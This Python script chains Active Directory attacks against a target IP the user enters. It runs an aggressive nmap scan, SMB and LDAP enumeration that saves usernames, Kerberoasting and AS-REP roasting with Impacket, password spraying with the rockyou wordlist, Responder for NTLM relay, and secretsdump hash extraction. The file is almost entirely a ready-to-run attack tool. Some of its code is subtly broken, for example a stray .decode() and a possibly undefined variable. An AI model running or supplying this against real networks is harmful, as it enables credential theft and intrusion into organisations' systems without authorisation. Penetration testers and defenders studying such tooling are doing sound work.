import subprocess
import os
import signal
import sys

# Flag to determine if brute-forcing is interrupted
bruteforce_skipped = False

# Function to handle signal for skipping brute-forcing
def signal_handler(sig, frame):
    global bruteforce_skipped
    print("\n[!] Brute-forcing skipped by user (Ctrl+C detected).")
    bruteforce_skipped = True

# Register the signal handler for skipping
signal.signal(signal.SIGINT, signal_handler)

# Function to check if a tool is installed
def is_tool_installed(tool_name, install_command=None):
    try:
        subprocess.run([tool_name, "--version"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except FileNotFoundError:
        print(f"[-] {tool_name} is not installed.")
        if install_command:
            print(f"[+] You can install it using: {install_command}")
        return False

# Check for required tools
def check_required_tools():
    required_tools = {
        "ldapsearch": "sudo apt install ldap-utils",
        "crackmapexec": "sudo apt install crackmapexec",
        "responder": "sudo apt install responder",
    }
    impacket_scripts = {
        "GetUserSPNs.py": "pip install impacket && cd /usr/share/doc/python3-impacket/examples/",
        "GetNPUsers.py": "pip install impacket && cd /usr/share/doc/python3-impacket/examples/",
        "secretsdump.py": "pip install impacket && cd /usr/share/doc/python3-impacket/examples/",
    }

    for tool, install_cmd in required_tools.items():
        if not is_tool_installed(tool, install_cmd):
            print(f"[-] Please install {tool} before running the script.")
            exit()

    for script, install_cmd in impacket_scripts.items():
        if not os.path.exists(f"/usr/share/doc/python3-impacket/examples/{script}"):
            print(f"[-] {script} not found. You can install it by running: {install_cmd}")
            exit()

# Nmap Scan Function
def run_nmap(ip):
    nmap_command = ["nmap", "-sV", "-A", "-T5", ip]
    result = subprocess.run(nmap_command, capture_output=True, text=True)
    return result.stdout

# Function to extract domain from Nmap output
def find_domain(nmap_result):
    print("[*] Attempting to find the domain from the Nmap scan results...")
    try:
        for line in nmap_result.splitlines():
            if "Domain name:" in line or "Domain:" in line:
                domain = line.split(":")[1].strip()
                print(f"[+] Domain found: {domain}")
                return domain
        print("[-] Domain not found in Nmap results.")
        return None
    except Exception as e:
        print(f"[-] Could not extract domain: {e}")
        return None

# DNS SRV Queries to Identify Domain Controllers
def find_domain_controllers(domain):
    print("[*] Querying DNS SRV records to find Domain Controllers...")
    try:
        dns_query = f"nslookup -type=srv _ldap._tcp.dc._msdcs.{domain}"
        dns_result = subprocess.run(dns_query, shell=True, capture_output=True, text=True)
        print(f"[+] Domain Controllers found:\n{dns_result.stdout}")
        return dns_result.stdout
    except Exception as e:
        print(f"[-] Error finding Domain Controllers: {e}")
        return None

# SMB Enumeration (Anonymous SMB Check)
def smb_enum(ip):
    smb_command = f"smbclient -L \\\\{ip} -N"
    print(f"Running SMB enumeration (anonymous check): {smb_command}")
    subprocess.run(smb_command, shell=True)

# LDAP Enumeration and Object Class Queries
def ldap_enum(ip, domain):
    try:
        ldap_command = f"ldapsearch -x -H ldap://{ip} -b 'DC={domain.replace('.',',DC=')}' '(objectclass=*)'"
        print(f"Running LDAP enumeration: {ldap_command}")
        result = subprocess.run(ldap_command, shell=True, capture_output=True, text=True)
        ldap_output = result.stdout.decode()
        print(ldap_output)

        usernames = []
        for line in ldap_output.splitlines():
            if "sAMAccountName:" in line:
                usernames.append(line.split(":")[1].strip())

        if usernames:
            with open("users.txt", "w") as user_file:
                for username in usernames:
                    user_file.write(f"{username}\n")
            print("[+] Usernames extracted and saved to users.txt.")
        else:
            print("[-] No sAMAccountNames found.")

        return usernames

    except Exception as e:
        print(f"[-] LDAP Enumeration failed: {e}")
        return []

# Kerberoasting using Impacket's GetUserSPNs with extracted users
def kerberoasting(ip, domain):
    try:
        if os.path.exists("users.txt"):
            kerb_command = f"/usr/share/doc/python3-impacket/examples/GetUserSPNs.py {domain}/ -usersfile users.txt -request -dc-ip {ip}"
            print(f"Running Kerberoasting: {kerb_command}")
            subprocess.run(kerb_command, shell=True)
        else:
            print("[-] No usernames available for Kerberoasting.")
    except Exception as e:
        print(f"[-] Kerberoasting failed: {e}")

# AS-REP Roasting using Impacket's GetNPUsers
def asrep_roasting(ip, domain):
    try:
        asrep_command = f"/usr/share/doc/python3-impacket/examples/GetNPUsers.py {domain}/ -no-pass -usersfile users.txt -format hashcat -dc-ip {ip}"
        print(f"Running AS-REP Roasting: {asrep_command}")
        subprocess.run(asrep_command, shell=True)
    except Exception as e:
        print(f"[-] AS-REP Roasting failed: {e}")

# Password Spraying with CrackMapExec, with Ctrl+C to skip
def password_spray(ip, domain):
    global bruteforce_skipped
    spray_command = f"crackmapexec smb {ip} -u users.txt -p /usr/share/wordlists/rockyou.txt --continue-on-success"
    print(f"Running Password Spraying: {spray_command}")

    try:
        subprocess.run(spray_command, shell=True)
    except KeyboardInterrupt:
        print("\n[!] Brute-forcing skipped by user.")
        bruteforce_skipped = True

# NTLM Relay Attack using Responder
def ntlm_relay():
    responder_command = "responder -I eth0"
    print(f"Starting Responder for NTLM Relay attacks: {responder_command}")
    subprocess.run(responder_command, shell=True)

# Extract NTLM Hashes with SecretsDump
def dump_ntlm_hashes(ip, domain):
    try:
        dump_command = f"/usr/share/doc/python3-impacket/examples/secretsdump.py {domain}/ -usersfile users.txt -dc-ip {ip}"
        print(f"Dumping NTLM hashes: {dump_command}")
        subprocess.run(dump_command, shell=True)
    except Exception as e:
        print(f"[-] NTLM Hash Dump failed: {e}")

# Main function that runs the enumeration and exploitation steps based on Nmap results
def main():
    check_required_tools()

    target_ip = input("Enter the target IP: ")

    # Run Nmap scan
    print("Starting Nmap scan...")
    nmap_result = run_nmap(target_ip)
    print(nmap_result)

    # Attempt to find the domain automatically
    domain = find_domain(nmap_result)
    if not domain:
        domain = input("Enter the domain manually (e.g., example.com): ")

    # Identify Domain Controllers via DNS SRV queries
    find_domain_controllers(domain)

    # Smart Enumeration and Exploitation Based on Detected Services
    if "445/tcp" in nmap_result:
        print("[+] SMB Detected, running enumeration...")
        smb_enum(target_ip)

    if "389/tcp" in nmap_result or "636/tcp" in nmap_result:
        print("[+] LDAP Detected, running enumeration...")
        usernames = ldap_enum(target_ip, domain)

    if "88/tcp" in nmap_result and usernames:
        print("[+] Kerberos Detected, attempting Kerberoasting...")
        kerberoasting(target_ip, domain)

        print("[+] Attempting AS-REP Roasting...")
        asrep_roasting(target_ip, domain)

    if not bruteforce_skipped:
        print("[+] Attempting password spraying...")
        password_spray(target_ip, domain)

    print("[+] Attempting NTLM Relay attacks using Responder...")
    ntlm_relay()

    print("[+] Attempting to dump NTLM hashes from the target...")
    dump_ntlm_hashes(target_ip, domain)

    print("Enumeration and exploitation complete.")

if __name__ == "__main__":
    main()
